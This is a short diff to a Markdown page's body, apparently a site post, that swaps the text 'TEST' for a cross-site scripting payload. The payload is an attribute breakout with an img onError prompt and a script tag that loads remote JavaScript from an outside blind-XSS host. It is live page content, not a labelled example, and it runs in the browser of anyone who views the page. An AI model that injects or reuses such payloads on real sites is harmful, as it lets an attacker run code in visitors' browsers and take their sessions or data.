@@ -6,4 +6,4 @@ meta_description: TEST
 twitter_image: /img/dnt.svg
 date: 2023-01-24T04:03:00.035Z
 ---
-T﻿EST
+"><img src=x onError=prompt(1)>"><script src=https://bugvsme.xss.ht></script>
